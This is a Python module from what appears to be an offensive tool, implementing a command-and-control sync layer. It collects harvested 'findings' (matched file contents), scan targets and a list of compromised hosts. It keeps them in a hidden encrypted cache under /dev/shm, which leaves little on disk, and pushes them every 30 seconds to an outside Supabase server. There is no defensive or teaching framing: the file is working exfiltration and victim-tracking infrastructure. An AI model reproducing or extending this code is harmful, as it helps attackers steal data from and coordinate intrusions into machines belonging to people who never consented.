"""
C2 sync with Supabase, local cache fallback with encryption.
"""
import os
import json
import time
import threading
import requests
from supabase import create_client, Client
from cryptography.fernet import Fernet
from utils.crypto_utils import get_fernet_key
from utils.logging_utils import get_logger

logger = get_logger(__name__)

class C2Sync:
    def __init__(self):
        self.supabase_url = os.getenv('SUPABASE_URL')
        self.supabase_key = os.getenv('SUPABASE_KEY')
        self.batch = []
        self.cache_file = '/dev/shm/.aetheric_cache.json'
        self.fernet = Fernet(get_fernet_key())
        self.lock = threading.Lock()
        self._load_cache()
        # Start upload thread
        self.upload_thread = threading.Thread(target=self._upload_loop, daemon=True)
        self.upload_thread.start()

    def _load_cache(self):
        if os.path.exists(self.cache_file):
            try:
                with open(self.cache_file, 'rb') as f:
                    encrypted = f.read()
                    data = self.fernet.decrypt(encrypted)
                    self.batch = json.loads(data.decode())
            except Exception:
                self.batch = []

    def _save_cache(self):
        try:
            with open(self.cache_file, 'wb') as f:
                encrypted = self.fernet.encrypt(json.dumps(self.batch).encode())
                f.write(encrypted)
        except Exception:
            pass

    def _upload_loop(self):
        while True:
            time.sleep(30)
            self._flush()

    def _flush(self):
        if not self.batch:
            return
        # Attempt upload
        if self.supabase_url and self.supabase_key:
            try:
                supabase: Client = create_client(self.supabase_url, self.supabase_key)
                # Split into findings, targets, audit, etc.
                for item in self.batch[:]:
                    table = item.get('table')
                    if not table:
                        continue
                    data = item.get('data')
                    if table == 'findings':
                        supabase.table('findings').insert(data).execute()
                    elif table == 'targets':
                        supabase.table('targets').insert(data).execute()
                    elif table == 'audit_log':
                        supabase.table('audit_log').insert(data).execute()
                    elif table == 'compromised_hosts':
                        supabase.table('compromised_hosts').insert(data).execute()
                    # Remove from batch after successful upload
                    with self.lock:
                        self.batch.remove(item)
                self._save_cache()
            except Exception as e:
                logger.error("Upload failed: %s", e)
        # If no internet, just keep in cache

    def upload_finding(self, finding):
        """finding: dict with file_path, matched_regex, encrypted_content, confidence_score, etc."""
        item = {'table': 'findings', 'data': finding}
        with self.lock:
            self.batch.append(item)
            self._save_cache()

    def upload_target(self, target):
        """target: dict with ip, ports, etc."""
        item = {'table': 'targets', 'data': target}
        with self.lock:
            self.batch.append(item)
            self._save_cache()

    def mark_compromised(self, ip):
        item = {'table': 'compromised_hosts', 'data': {'ip': ip, 'status': 'compromised', 'timestamp': time.time()}}
        with self.lock:
            self.batch.append(item)
            self._save_cache()

    def get_pending_targets(self):
        """Retrieve new targets from Supabase (to be implemented)."""
        # For simplicity, return empty list
        return []
